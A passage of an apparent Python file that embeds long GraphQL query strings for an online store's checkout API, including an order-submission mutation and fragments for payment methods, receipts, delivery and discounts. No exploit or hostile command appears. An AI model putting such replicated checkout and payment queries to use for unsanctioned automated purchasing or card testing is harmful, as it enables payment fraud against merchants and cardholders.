FilledTipTerms{tipLines{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}localizationExtension{...on LocalizationExtension{fields{...on LocalizationExtensionField{key title value __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}dutiesIncluded nonNegotiableTerms{signature contents{signature targetTerms targetLine{allLines index __typename}attributes __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}attribution{attributions{...on RetailAttributions{deviceId locationId userId __typename}...on DraftOrderAttributions{userIdentifier:userId sourceName locationIdentifier:locationId __typename}__typename}__typename}saleAttributions{attributions{...on SaleAttribution{recipient{...on StaffMember{id __typename}...on Location{id __typename}...on PointOfSaleDevice{id __typename}__typename}targetMerchandiseLines{...FilledMerchandiseLineTargetCollectionFragment...on AnyMerchandiseLineTargetCollection{any __typename}__typename}__typename}__typename}__typename}managedByMarketsPro captcha{...on Captcha{provider challenge sitekey token __typename}...on PendingTerms{taskId pollDelay __typename}__typename}cartCheckoutValidation{...on PendingTerms{taskId pollDelay __typename}__typename}alternativePaymentCurrency{...on AllocatedAlternativePaymentCurrencyTotal{total{amount currencyCode __typename}paymentLineAllocations{amount{amount currencyCode __typename}stableId __typename}__typename}__typename}isShippingRequired __typename}fragment ProposalDeliveryExpectationFragment on DeliveryExpectationTerms{__typename...on FilledDeliveryExpectationTerms{deliveryExpectations{minDeliveryDateTime maxDeliveryDateTime deliveryStrategyHandle brandedPromise{logoUrl darkThemeLogoUrl lightThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name handle __typename}deliveryOptionHandle deliveryExpectationPresentmentTitle{short long __typename}promiseProviderApiClientId signedHandle returnability __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment RedeemablePaymentMethodFragment on RedeemablePaymentMethod{redemptionSource redemptionContent{...on ShopCashRedemptionContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionPaymentOptionKind redemptionId destinationAmount{amount currencyCode __typename}sourceAmount{amount currencyCode __typename}__typename}...on StoreCreditRedemptionContent{storeCreditAccountId __typename}...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}__typename}__typename}fragment UiExtensionInstallationFragment on UiExtensionInstallation{extension{approvalScopes{handle __typename}capabilities{apiAccess networkAccess blockProgress collectBuyerConsent{smsMarketing customerPrivacy __typename}__typename}apiVersion appId appUrl preloads{target namespace value __typename}appName extensionLocale extensionPoints name registrationUuid scriptUrl translations uuid version __typename}__typename}fragment CustomerCreditCardPaymentMethodFragment on CustomerCreditCardPaymentMethod{cvvSessionId paymentMethodIdentifier token displayLastDigits brand defaultPaymentMethod deletable requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}fragment PaypalBillingAgreementPaymentMethodFragment on PaypalBillingAgreementPaymentMethod{paymentMethodIdentifier token billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}fragment PaymentLines on PaymentLine{stableId specialInstructions amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier creditCard{...on CreditCard{brand lastDigits name __typename}__typename}paymentAttributes __typename}...on GiftCardPaymentMethod{code balance{amount currencyCode __typename}__typename}...on RedeemablePaymentMethod{...RedeemablePaymentMethodFragment __typename}...on WalletsPlatformPaymentMethod{name walletParams __typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier __typename}...on PaypalWalletContent{paypalBillingAddress:billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}email payerId token paymentMethodIdentifier acceptedSubscriptionTerms expiresAt merchantId __typename}...on ApplePayWalletContent{data signature version lastDigits paymentMethodIdentifier header{applicationData ephemeralPublicKey publicKeyHash transactionId __typename}__typename}...on GooglePayWalletContent{signature signedMessage protocolVersion paymentMethodIdentifier __typename}...on FacebookPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}containerData containerId mode paymentMethodIdentifier __typename}...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken paymentMethodIdentifier __typename}__typename}__typename}...on LocalPaymentMethod{paymentMethodIdentifier name additionalParameters{...on IdealPaymentMethodParameters{bank __typename}__typename}__typename}...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier __typename}...on OffsitePaymentMethod{paymentMethodIdentifier name __typename}...on CustomPaymentMethod{id name additionalDetails paymentInstructions paymentMethodIdentifier __typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name paymentAttributes __typename}...on ManualPaymentMethod{id name paymentMethodIdentifier __typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on CustomerCreditCardPaymentMethod{...CustomerCreditCardPaymentMethodFragment __typename}...on PaypalBillingAgreementPaymentMethod{...PaypalBillingAgreementPaymentMethodFragment __typename}...on NoopPaymentMethod{__typename}__typename}__typename}
"""

# MUTATION_SUBMIT
MUTATION_SUBMIT = """mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$metafields:[MetafieldInput!],$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken metafields:$metafields postPurchaseInquiryResult:$postPurchaseInquiryResult analytics:$analytics){...on SubmitSuccess{receipt{...ReceiptDetails __typename}__typename}...on SubmitAlreadyAccepted{receipt{...ReceiptDetails __typename}__typename}...on SubmitFailed{reason __typename}...on SubmitRejected{buyerProposal{...BuyerProposalDetails __typename}sellerProposal{...ProposalDetails __typename}errors{...on NegotiationError{code localizedMessage nonLocalizedMessage localizedMessageHtml...on RemoveTermViolation{message{code localizedDescription __typename}target __typename}...on AcceptNewTermViolation{message{code localizedDescription __typename}target __typename}...on ConfirmChangeViolation{message{code localizedDescription __typename}from to __typename}...on UnprocessableTermViolation{message{code localizedDescription __typename}target __typename}...on UnresolvableTermViolation{message{code localizedDescription __typename}target __typename}...on ApplyChangeViolation{message{code localizedDescription __typename}target from{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}to{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}__typename}...on InputValidationError{field __typename}...on PendingTermViolation{__typename}__typename}__typename}__typename}...on Throttled{pollAfter pollUrl queueToken buyerProposal{...BuyerProposalDetails __typename}__typename}...on CheckpointDenied{redirectUrl __typename}...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}__typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl confirmationPage{url shouldRedirect __typename}orderStatusPageUrl shopPay shopPayInstallments analytics{checkoutCompletedEventId emitConversionEvent __typename}poNumber orderIdentity{buyerIdentifier id __typename}customerId isFirstOrder eligibleForMarketingOptIn purchaseOrder{...ReceiptPurchaseOrder __typename}orderCreationStatus{__typename}paymentDetails{paymentCardBrand creditCardLastFourDigits paymentAmount{amount currencyCode __typename}paymentGateway financialPendingReason paymentDescriptor buyerActionInfo{...on MultibancoBuyerActionInfo{entity reference __typename}__typename}__typename}shopAppLinksAndResources{mobileUrl qrCodeUrl canTrackOrderUpdates shopInstallmentsViewSchedules shopInstallmentsMobileUrl installmentsHighlightEligible mobileUrlAttributionPayload shopAppEligible shopAppQrCodeKillswitch shopPayOrder buyerHasShopApp buyerHasShopPay orderUpdateOptions __typename}postPurchasePageUrl postPurchasePageRequested postPurchaseVaultedPaymentMethodStatus paymentFlexibilityPaymentTermsTemplate{__typename dueDate dueInDays id translatedName type}__typename}...on ProcessingReceipt{id purchaseOrder{...ReceiptPurchaseOrder __typename}pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}...on CompletePaymentChallengeV2{challengeType challengeData __typename}__typename}timeout{millisecondsRemaining __typename}__typename}...on FailedReceipt{id processingError{...on InventoryClaimFailure{__typename}...on InventoryReservationFailure{__typename}...on OrderCreationFailure{paymentsHaveBeenReverted __typename}...on OrderCreationSchedulingFailure{__typename}...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}...on DiscountUsageLimitExceededFailure{__typename}...on CustomerPersistenceFailure{__typename}__typename}__typename}__typename}fragment ReceiptPurchaseOrder on PurchaseOrder{__typename sessionToken totalAmountToPay{amount currencyCode __typename}checkoutCompletionTarget delivery{...on PurchaseOrderDeliveryTerms{deliveryLines{__typename availableOn deliveryStrategy{handle title description methodType brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl darkThemeCompactLogoUrl name __typename}pickupLocation{...on PickupInStoreLocation{name address{address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}instructions __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}carrierCode carrierName name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyBreakdown{__typename amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}...on PurchaseOrderLineComponent{stableId quantity componentCapabilities componentSource merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}lineAmount{amount currencyCode __typename}lineAmountAfterDiscounts{amount currencyCode __typename}destinationAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}__typename}groupType targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}...on PurchaseOrderLineComponent{stableId componentCapabilities componentSource quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}__typename}deliveryExpectations{__typename brandedPromise{name logoUrl handle lightThemeLogoUrl darkThemeLogoUrl __typename}deliveryStrategyHandle deliveryExpectationPresentmentTitle{short long __typename}returnability{returnable __typename}}payment{...on PurchaseOrderPaymentTerms{billingAddress{__typename...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}}paymentLines{amount{amount currencyCode __typename}postPaymentMessage dueAt paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier vaultingAgreement creditCard{brand lastDigits __typename}billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomerCreditCardPaymentMethod{brand displayLastDigits token deletable defaultPaymentMethod requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on PurchaseOrderGiftCardPaymentMethod{balance{amount currencyCode __typename}code __typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier paymentMethod paymentAttributes __typename}...on PaypalWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}email payerId token expiresAt __typename}...on ApplePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}data signature version __typename}...on GooglePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}signature signedMessage protocolVersion __typename}...on FacebookPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}containerData containerId mode __typename}...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken creditCard{brand lastDigits __typename}__typename}__typename}__typename}...on WalletsPlatformPaymentMethod{name walletParams __typename}...on LocalPaymentMethod{paymentMethodIdentifier name displayName billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}additionalParameters{...on IdealPaymentMethodParameters{bank __typename}__typename}__typename}...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on OffsitePaymentMethod{paymentMethodIdentifier name billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on ManualPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on PaypalBillingAgreementPaymentMethod{token billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on RedeemablePaymentMethod{redemptionSource redemptionContent{...on ShopCashRedemptionContent{redemptionPaymentOptionKind billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionId __typename}...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}...on StoreCreditRedemptionContent{storeCreditAccountId __typename}__typename}__typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name __typename}__typename}__typename}__typename}__typename}buyerIdentity{...on PurchaseOrderBuyerIdentityTerms{contactMethod{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}marketingConsent{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}__typename}customer{__typename...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}__typename}...on DecodedCustomerProfile{id presentmentCurrency fullName firstName lastName countryCode email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone __typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl email ordersCount phone market{id handle __typename}__typename}}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name __typename}__typename}__typename}merchandise{taxesIncluded merchandiseLines{stableId legacyFee merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}lineComponents{...PurchaseOrderBundleLineComponent __typename}components{...PurchaseOrderLineComponent __typename}quantity{__typename...on PurchaseOrderMerchandiseQuantityByItem{items __typename}}recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}lineAmount{__typename amount currencyCode}__typename}__typename}tax{totalTaxAmountV2{__typename amount currencyCode}totalDutyAmount{amount currencyCode __typename}totalTaxAndDutyAmount{amount currencyCode __typename}totalAmountIncludedInTarget{amount currencyCode __typename}__typename}discounts{lines{...PurchaseOrderDiscountLineFragment __typename}__typename}legacyRepresentProductsAsFees totalSavings{amount currencyCode __typename}subtotalBeforeTaxesAndShipping{amount currencyCode __typename}legacySubtotalBeforeTaxesShippingAndFees{amount currencyCode __typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}dutiesIncluded tip{tipLines{amount{amount currencyCode __typename}__typename}__typename}hasOnlyDeferredShipping note{customAttributes{key value __typename}message __typename}shopPayArtifact{optIn{vaultPhone __typename}__typename}recurringTotals{fixedPrice{amount currencyCode __typename}fixedPriceCount interval intervalCount recurringPrice{amount currencyCode __typename}title __typename}checkoutTotalBeforeTaxesAndShipping{__typename amount currencyCode}checkoutTotal{__typename amount currencyCode}checkoutTotalTaxes{__typename amount currencyCode}subtotalBeforeReductions{__typename amount currencyCode}deferredTotal{amount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}dueAt subtotalAmount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}taxes{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}__typename}metafields{key namespace value valueType:type __typename}}fragment ProductVariantSnapshotMerchandiseDetails on ProductVariantSnapshot{variantId options{name value __typename}productTitle title productUrl untranslatedTitle untranslatedSubtitle sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}deferredAmount{amount currencyCode __typename}digest giftCard image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}price{amount currencyCode __typename}productId productType properties{...MerchandiseProperties __typename}requiresShipping sku taxCode taxable vendor weight{unit value __typename}__typename}fragment MerchandiseProperties on MerchandiseProperty{name value{...on MerchandisePropertyValueString{string:value __typename}...on MerchandisePropertyValueInt{int:value __typename}...on MerchandisePropertyValueFloat{float:value __typename}...on MerchandisePropertyValueBoolean{boolean:value __typename}...on MerchandisePropertyValueJson{json:value __typename}__typename}visible __typename}fragment DiscountDetailsFragment on Discount{...on CustomDiscount{title description presentationLevel allocationMethod targetSelection targetType signature signatureUuid type value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on CodeDiscount{title code presentationLevel allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on DiscountCodeTrigger{code __typename}...on AutomaticDiscount{presentationLevel title allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}fragment PurchaseOrderBundleLineComponent on PurchaseOrderBundleLineComponent{stableId merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}quantity recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}totalAmount{__typename amount currencyCode}__typename}fragment PurchaseOrderLineComponent on PurchaseOrderLineComponent{stableId componentCapabilities componentSource merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}quantity recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}totalAmount{__typename amount currencyCode}__typename}fragment PurchaseOrderDiscountLineFragment on PurchaseOrderDiscountLine{discount{...DiscountDetailsFragment __typename}lineAmount{amount currencyCode __typename}deliveryAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}merchandiseAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}__typename}fragment BuyerProposalDetails on Proposal{buyerIdentity{...on FilledBuyerIdentityTerms{email phone customer{...on CustomerProfile{email __typename}...on BusinessCustomerProfile{email __typename}__typename}__typename}__typename}merchandiseDiscount{...ProposalDiscountFragment __typename}deliveryDiscount{...ProposalDiscountFragment __typename}delivery{...ProposalDeliveryFragment __typename}merchandise{...on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}components{...MerchandiseLineComponentWithCapabilities __typename}legacyFee __typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deferredTotal{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt __typename}hasOnlyDeferredShipping subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacySubtotalBeforeTaxesShippingAndFees{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}attribution{attributions{...on RetailAttributions{deviceId locationId userId __typename}...on DraftOrderAttributions{userIdentifier:userId sourceName locationIdentifier:locationId __typename}__typename}__typename}saleAttributions{attributions{...on SaleAttribution{recipient{...on StaffMember{id __typename}...on Location{id __typename}...on PointOfSaleDevice{id __typename}__typename}targetMerchandiseLines{...FilledMerchandiseLineTargetCollectionFragment...on AnyMerchandiseLineTargetCollection{any __typename}__typename}__typename}__typename}__typename}nonNegotiableTerms{signature contents{signature targetTerms targetLine{allLines index __typename}attributes __typename}__typename}__typename}fragment ProposalDiscountFragment on DiscountTermsV2{__typename...on FilledDiscountTerms{acceptUnexpectedDiscounts lines{...DiscountLineDetailsFragment __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment DiscountLineDetailsFragment on DiscountLine{allocations{...on DiscountAllocatedAllocationSet{__typename allocations{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}target{index targetType stableId __typename}__typename}}__typename}discount{...DiscountDetailsFragment __typename}lineAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}fragment ProposalDeliveryFragment on DeliveryTerms{__typename...on FilledDeliveryTerms{intermediateRates progressiveRatesEstimatedTimeUntilCompletion shippingRatesStatusToken deliveryLines{destinationAddress{...on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on Geolocation{country{code __typename}zone{code __typename}coordinates{latitude longitude __typename}postalCode __typename}...on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType deliveryMethodTypes selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}...on DeliveryStrategyReference{handle __typename}__typename}availableDeliveryStrategies{...on CompleteDeliveryStrategy{title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms brandedPromise{logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{...on IntIntervalConstraint{lowerBound upperBound __typename}...on IntValueConstraint{value __typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{...on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}businessHours{day openingTime closingTime __typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment FilledMerchandiseLineTargetCollectionFragment on FilledMerchandiseLineTargetCollection{linesV2{...on MerchandiseLine{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on MerchandiseBundleLineComponent{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on MerchandiseLineComponentWithCapabilities{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}fragment DeliveryLineMerchandiseFragment on ProposalMerchandise{...on SourceProvidedMerchandise{__typename requiresShipping}...on ProductVariantMerchandise{__typename requiresShipping}...on ContextualizedProductVariantMerchandise{__typename requiresShipping sellingPlan{id digest name prepaid deliveriesPerBillingCycle subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}}...on MissingProductVariantMerchandise{__typename variantId}__typename}fragment SourceProvidedMerchandise on Merchandise{...on 